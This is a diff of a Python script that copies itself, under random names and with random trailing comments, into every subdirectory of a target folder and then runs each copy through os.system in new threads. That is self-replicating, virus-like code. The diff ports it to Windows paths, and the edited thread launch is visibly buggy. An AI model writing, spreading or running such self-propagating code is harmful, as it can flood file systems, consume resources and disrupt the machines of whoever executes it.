@@ -40,8 +40,9 @@ def previousFolder(file, lines):
                 print("this is where it is")
                 file.write("\nos.chdir('../')\n")
 
-def runFunc(filename):
-    os.system('python3 ' + filename)
+def runFunc(dir, filename):
+    os.chdir(dir)
+    os.system('python3 .\\' + filename)
 
 #get the current file
 thisfile = os.path.basename(__file__)
@@ -78,15 +79,17 @@ filename = "newpython{randomness}.py".format(randomness="".join(random.choices(s
     
     
 for x in os.walk(directory):
-    g = open(x[0] + "/" + filename, "w")
-    print(x[0] + "/" + "printing here")
+    print(x[0])
+    g = open(x[0] + "\\" + filename, "w")
     writeIntoFile(g, lines)
     g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
     g.close()
+    
 
 for x in os.walk(directory):
-    thread = Thread(target=runFunc(x[0] + "/" + filename))
+    thread = Thread(target=runFunc(dir, filename))
     thread.start()
+    
 
 
 
